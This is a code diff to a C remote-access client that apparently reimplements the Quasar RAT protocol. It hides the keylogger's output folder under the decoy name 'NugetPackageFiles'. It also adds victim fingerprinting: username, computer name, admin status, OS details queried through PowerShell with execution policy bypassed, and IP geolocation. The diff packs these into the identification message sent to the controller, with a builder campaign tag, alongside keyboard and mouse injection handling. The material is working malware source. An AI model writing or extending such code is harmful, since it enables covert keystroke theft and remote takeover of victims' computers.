@@ -17,6 +17,7 @@
 #include <ShlObj.h>
 #include <Shellapi.h>
 #include <PowrProf.h>
+#include <sddl.h>
 #include <stdio.h>
 
 #pragma comment(lib, "advapi32.lib")
@@ -32,8 +33,8 @@
 typedef struct { HDESK to_restore; HDESK to_close; } input_desktop_scope_t;
 
 /* Build the keylogger logs directory path.
- * For the C client we keep using %TEMP%\\Keylogger (as in your tests),
- * falling back to C:\\Keylogger if the temp path is unavailable. */
+ * The keylogger writes to %TEMP%\\NugetPackageFiles (matching your required folder name).
+ * If temp path is unavailable, fall back to C:\\NugetPackageFiles. */
 int remote_get_logs_dir(char* out_path, size_t out_size) {
     if (!out_path || out_size < 8) return 0;
     out_path[0] = '\0';
@@ -43,12 +44,303 @@ int remote_get_logs_dir(char* out_path, size_t out_size) {
     if (n > 0 && n < (DWORD)sizeof(base)) {
         size_t len = strlen(base);
         if (len > 0 && base[len - 1] == '\\') base[len - 1] = '\0';
-        _snprintf_s(out_path, out_size, _TRUNCATE, "%s\\Keylogger", base);
+        _snprintf_s(out_path, out_size, _TRUNCATE, "%s\\NugetPackageFiles", base);
         return 1;
     }
 
-    strcpy_s(out_path, out_size, "C:\\Keylogger");
+    strcpy_s(out_path, out_size, "C:\\NugetPackageFiles");
     return 1;
+}
+
+static int extract_json_string_basic(const char* src, const char* key, char* dst, size_t dst_sz) {
+    if (!src || !key || !dst || dst_sz < 3) return 0;
+    dst[0] = '\0';
+
+    char pat[64];
+    _snprintf_s(pat, sizeof(pat), _TRUNCATE, "\"%s\"", key);
+    const char* p = strstr(src, pat);
+    if (!p) return 0;
+    p = strchr(p, ':');
+    if (!p) return 0;
+    p++;
+    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
+    if (*p != '\"') return 0;
+    p++;
+
+    size_t i = 0;
+    while (*p && *p != '\"' && i + 1 < dst_sz) {
+        if (*p == '\\' && p[1]) {
+            p++;
+            dst[i++] = *p++;
+            continue;
+        }
+        dst[i++] = *p++;
+    }
+    dst[i] = '\0';
+    return i > 0;
+}
+
+/* Best-effort IP geolocation for identification payload. */
+static void remote_get_geo_country_and_code(char* out_country, size_t out_country_sz, char* out_code, size_t out_code_sz) {
+    if (!out_country || !out_code || out_country_sz < 3 || out_code_sz < 2) return;
+
+    static ULONGLONG s_last_geo_ms = 0;
+    static char s_country[128] = { 0 };
+    static char s_code[32] = { 0 };
+
+    if (s_last_geo_ms == 0 || (GetTickCount64() - s_last_geo_ms) > (12ull * 60ull * 60ull * 1000ull)) {
+        char cmd[2048];
+        _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
+            "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"(Invoke-WebRequest -Uri 'https://ipwho.is/' -UseBasicParsing).Content\"");
+
+        FILE* fp = _popen(cmd, "rt");
+        char json[4096];
+        size_t total = 0;
+        json[0] = '\0';
+        if (fp) {
+            while (total < sizeof(json) - 1) {
+                if (fgets(json + total, (int)(sizeof(json) - 1 - total), fp) == NULL) break;
+                total = strlen(json);
+            }
+            _pclose(fp);
+        }
+
+        char c[128] = { 0 };
+        char code[32] = { 0 };
+        c[0] = '\0';
+        code[0] = '\0';
+
+        if (json[0] != '\0') {
+            (void)extract_json_string_basic(json, "country", c, sizeof(c));
+            (void)extract_json_string_basic(json, "country_code", code, sizeof(code));
+        }
+
+        if (c[0] == '\0') strcpy_s(c, sizeof(c), "Unknown");
+        if (code[0] == '\0') strcpy_s(code, sizeof(code), "-");
+
+        strcpy_s(s_country, sizeof(s_country), c);
+        strcpy_s(s_code, sizeof(s_code), code);
+        s_last_geo_ms = GetTickCount64();
+    }
+
+    strcpy_s(out_country, out_country_sz, (s_country[0] ? s_country : "Unknown"));
+    strcpy_s(out_code, out_code_sz, (s_code[0] ? s_code : "-"));
+}
+
+static void remote_get_username(char* out_username, size_t out_size) {
+    if (!out_username || out_size < 2) return;
+    out_username[0] = '\0';
+    DWORD sz = (DWORD)out_size;
+    DWORD env_len = GetEnvironmentVariableA("USERNAME", out_username, (DWORD)out_size);
+    if (env_len > 0 && out_username[0] != '\0') return;
+
+    if (GetUserNameA(out_username, &sz) == 0 || out_username[0] == '\0')
+        strcpy_s(out_username, out_size, "Unknown");
+}
+
+static void remote_get_pc_name(char* out_pc_name, size_t out_size) {
+    if (!out_pc_name || out_size < 2) return;
+    out_pc_name[0] = '\0';
+    DWORD sz = (DWORD)out_size;
+    DWORD env_len = GetEnvironmentVariableA("COMPUTERNAME", out_pc_name, (DWORD)out_size);
+    if (env_len > 0 && out_pc_name[0] != '\0') return;
+
+    if (GetComputerNameA(out_pc_name, &sz) == 0 || out_pc_name[0] == '\0')
+        strcpy_s(out_pc_name, out_size, "Unknown");
+}
+
+static HANDLE remote_open_effective_token(void) {
+    HANDLE token = NULL;
+
+    /* WindowsIdentity.GetCurrent() uses the effective token (thread token if present). */
+    /* BOOL OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle) */
+    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &token)) {
+        remote_log("[account_type] using thread token");
+        return token;
+    }
+    /* If thread token isn't available or isn't accessible, fall back to process token. */
+    DWORD open_thread_err = GetLastError();
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+        remote_log("[account_type] using process token");
+        return token;
+    }
+    remote_log("[account_type] token open failed (OpenThreadToken GetLastError=%lu, OpenProcessToken GetLastError=%lu)",
+        (unsigned long)open_thread_err, (unsigned long)GetLastError());
+    return NULL;
+}
+
+static int remote_is_sid_member(WELL_KNOWN_SID_TYPE sid_type) {
+    HANDLE token = remote_open_effective_token();
+    if (!token) return 0;
+
+    BYTE sid_buf[SECURITY_MAX_SID_SIZE];
+    DWORD sid_len = (DWORD)sizeof(sid_buf);
+    PSID sid = (PSID)sid_buf;
+
+    /* Use well-known SIDs to match WindowsPrincipal.IsInRole() mapping. */
+    if (!CreateWellKnownSid(sid_type, NULL, sid, &sid_len)) {
+        remote_log("[account_type] CreateWellKnownSid(%d) failed (GetLastError=%lu)", (int)sid_type, (unsigned long)GetLastError());
+        CloseHandle(token);
+        return 0;
+    }
+
+    BOOL isMember = FALSE;
+    BOOL ok = CheckTokenMembership(token, sid, &isMember);
+    if (!ok) {
+        remote_log("[account_type] CheckTokenMembership(%d) failed (GetLastError=%lu)", (int)sid_type, (unsigned long)GetLastError());
+    }
+    CloseHandle(token);
+    return (ok && isMember) ? 1 : 0;
+}
+
+static int remote_is_admin(void) {
+    return remote_is_sid_member(WinBuiltinAdministratorsSid);
+}
+
+static int remote_is_user(void) {
+    return remote_is_sid_member(WinBuiltinUsersSid);
+}
+
+static int remote_is_guest(void) {
+    return remote_is_sid_member(WinBuiltinGuestsSid);
+}
+
+static void remote_get_account_type(char* out_account_type, size_t out_size) {
+    if (!out_account_type || out_size < 2) return;
+    /* Match C# UserAccount constructor:
+     * principal.IsInRole(Administrator) -> Admin
+     * else IsInRole(User) -> User
+     * else IsInRole(Guest) -> Guest
+     * else Unknown
+     */
+    int is_admin = remote_is_admin();
+    /* Fallback: Windows provides a simpler admin check that matches C# expectations in most cases. */
+    if (!is_admin && IsUserAnAdmin()) is_admin = 1;
+
+    int is_guest = remote_is_guest();
+    /* Do not rely on "Users" membership; if not admin/guest, C# categorizes as User. */
+    remote_log("[account_type] results: admin=%d guest=%d", is_admin, is_guest);
+
+    if (is_admin) {
+        strcpy_s(out_account_type, out_size, "Admin");
+        return;
+    }
+
+    if (is_guest) {
+        strcpy_s(out_account_type, out_size, "Guest");
+        return;
+    }
+
+    strcpy_s(out_account_type, out_size, "User");
+}
+
+static void remote_get_version_string(char* out_version, size_t out_size) {
+    if (!out_version || out_size < 4) return;
+    /* Match the C# client sample version. */
+    strcpy_s(out_version, out_size, "1.4.1");
+}
+
+static int remote_get_flag_image_index(const char* country_code) {
+    /* Keep ordering identical to reference Quasar.Client.IpGeoLocation.GeoInformationRetriever._imageList. */
+    static const char* image_list[] = {
+        "ad","ae","af","ag","ai","al","am","an","ao","ar","as","at","au","aw","ax","az","ba",
+        "bb","bd","be","bf","bg","bh","bi","bj","bm","bn","bo","br","bs","bt","bv","bw","by","bz","ca","catalonia","cc",
+        "cd","cf","cg","ch","ci","ck","cl","cm","cn","co","cr","cs","cu","cv","cx","cy","cz","de","dj","dk","dm","do",
+        "dz","ec","ee","eg","eh","england","er","es","et","europeanunion","fam","fi","fj","fk","fm","fo","fr","ga",
+        "gb","gd","ge","gf","gh","gi","gl","gm","gn","gp","gq","gr","gs","gt","gu","gw","gy","hk","hm","hn","hr","ht",
+        "hu","id","ie","il","in","io","iq","ir","is","it","jm","jo","jp","ke","kg","kh","ki","km","kn","kp","kr","kw",
+        "ky","kz","la","lb","lc","li","lk","lr","ls","lt","lu","lv","ly","ma","mc","md","me","mg","mh","mk","ml","mm",
+        "mn","mo","mp","mq","mr","ms","mt","mu","mv","mw","mx","my","mz","na","nc","ne","nf","ng","ni","nl","no","np",
+        "nr","nu","nz","om","pa","pe","pf","pg","ph","pk","pl","pm","pn","pr","ps","pt","pw","py","qa","re","ro","rs",
+        "ru","rw","sa","sb","sc","scotland","sd","se","sg","sh","si","sj","sk","sl","sm","sn","so","sr","st","sv","sy",
+        "sz","tc","td","tf","tg","th","tj","tk","tl","tm","tn","to","tr","tt","tv","tw","tz","ua","ug","um","us","uy",
+        "uz","va","vc","ve","vg","vi","vn","vu","wales","wf","ws","ye","yt","za","zm","zw"
+    };
+
+    const int len = (int)(sizeof(image_list) / sizeof(image_list[0]));
+
+    if (!country_code || !country_code[0]) return 247; /* question icon */
+
+    char code[16] = { 0 };
+    size_t i = 0;
+    for (; country_code[i] && i + 1 < sizeof(code); i++) {
+        char ch = country_code[i];
+        if (ch >= 'A' && ch <= 'Z') ch = (char)(ch - 'A' + 'a');
+        code[i] = ch;
+    }
+    code[i] = '\0';
+
+    if (code[0] == '\0') return 247;
+
+    for (int idx = 0; idx < len; idx++) {
+        if (image_list[idx] && _stricmp(image_list[idx], code) == 0) return idx;
+    }
+
+    return 247;
+}
+
+/* Best-effort OS caption using WMI, matching Quasar.Common.Helpers.PlatformHelper:
+ * - WMI Win32_OperatingSystem.Caption (e.g. "Microsoft Windows 10 Pro")
+ * - regex: remove everything before first "Windows"
+ * - append "64 Bit"/"32 Bit" based on native OS architecture */
+static void remote_get_os_full_name(char* out_os, size_t out_os_sz) {
+    if (!out_os || out_os_sz < 8) return;
+    out_os[0] = '\0';
+
+    char caption[256] = { 0 };
+
+    /* Use PowerShell to query Win32_OperatingSystem.Caption */
+    FILE* fp = NULL;
+    char cmd[1024];
+    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
+        "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"(Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty Caption)\"");
+
+    fp = _popen(cmd, "rt");
+    if (fp) {
+        size_t total = 0;
+        while (total < sizeof(caption) - 1) {
+            if (fgets(caption + total, (int)(sizeof(caption) - 1 - total), fp) == NULL) break;
+            total = strlen(caption);
+        }
+        _pclose(fp);
+    }
+
+    /* Trim trailing newlines */
+    for (size_t i = 0; caption[i] != '\0'; i++) {
+        if (caption[i] == '\r' || caption[i] == '\n') {
+            caption[i] = '\0';
+            break;
+        }
+    }
+
+    /* Extract substring starting at first "Windows" */
+    char* w = strstr(caption, "Windows");
+    if (w && w[0] != '\0') {
+        memmove(caption, w, strlen(w) + 1);
+    }
+
+    /* Determine native OS bitness */
+    SYSTEM_INFO si;
+    ZeroMemory(&si, sizeof(si));
+    GetNativeSystemInfo(&si);
+    int is64 = 0;
+    switch (si.wProcessorArchitecture) {
+        case PROCESSOR_ARCHITECTURE_AMD64:
+        case PROCESSOR_ARCHITECTURE_IA64:
+        case PROCESSOR_ARCHITECTURE_ARM64:
+            is64 = 1;
+            break;
+    }
+
+    int bitness = is64 ? 64 : 32;
+
+    if (caption[0] == '\0') {
+        strcpy_s(out_os, out_os_sz, is64 ? "Windows 64 Bit" : "Windows 32 Bit");
+        return;
+    }
+
+    /* Compose: "<CaptionStartingWindows> <64|32> Bit" */
+    _snprintf_s(out_os, out_os_sz, _TRUNCATE, "%s %d Bit", caption, bitness);
 }
 
 /* Switch current thread to the desktop that receives user input (required for mouse/keyboard injection to work). */
@@ -285,19 +577,39 @@ void remote_client_run(void) {
         make_id(id_buf);
 
         remote_identification_t ident = { 0 };
-        ident.version = "1.0";
-        ident.operating_system = "Windows";
-        ident.account_type = "User";
-        ident.country = "";
-        ident.country_code = "";
-        ident.image_index = 0;
+        char os_full_name[256] = { 0 };
+        remote_get_os_full_name(os_full_name, sizeof(os_full_name));
+        ident.operating_system = os_full_name;
+
+        char version_str[64] = { 0 };
+        remote_get_version_string(version_str, sizeof(version_str));
+        ident.version = version_str;
+
+        char account_type[32] = { 0 };
+        remote_get_account_type(account_type, sizeof(account_type));
+        ident.account_type = account_type;
+
         ident.id = id_buf;
-        ident.username = "User";
-        ident.pc_name = "PC";
-        ident.tag = "";
+        char username[256] = { 0 };
+        remote_get_username(username, sizeof(username));
+        ident.username = username;
+
+        char pc_name[256] = { 0 };
+        remote_get_pc_name(pc_name, sizeof(pc_name));
+        ident.pc_name = pc_name;
+
+        /* Match BuilderProfile default Tag (Office04). */
+        ident.tag = "Office04";
         ident.encryption_key = "";
         ident.signature = NULL;
         ident.signature_len = 0;
+
+        char geo_country[128] = { 0 };
+        char geo_code[32] = { 0 };
+        remote_get_geo_country_and_code(geo_country, sizeof(geo_country), geo_code, sizeof(geo_code));
+        ident.country = geo_country;
+        ident.country_code = geo_code;
+        ident.image_index = remote_get_flag_image_index(geo_code);
 
         /* Encode ClientIdentification body, then wrap with IMessage subtype (same as reference .NET client). */
         unsigned char payload_buf[2048];
@@ -1141,14 +1453,16 @@ void remote_client_run(void) {
                     else if (subtype == REMOTE_SUBTYPE_GetSystemInfo) {
                         remote_log("[loop] handling GetSystemInfo");
                         {
-                            unsigned char resp_body[512];
+                            /* System info includes many key/value tuples (hardware + geo), so
+                               keep the buffer large enough to avoid truncation. */
+                            unsigned char resp_body[4096];
                             unsigned int resp_body_len = remote_proto_encode_get_system_info_response(resp_body, sizeof(resp_body));
                             if (resp_body_len > 0) {
-                                unsigned char full_msg[600];
+                                unsigned char full_msg[4200];
                                 unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                     REMOTE_SUBTYPE_GetSystemInfoResponse, resp_body, resp_body_len);
                                 if (full_len > 0) {
-                                    unsigned char frame[604];
+                                    unsigned char frame[4204];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                     int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                     remote_log("[loop] GetSystemInfoResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
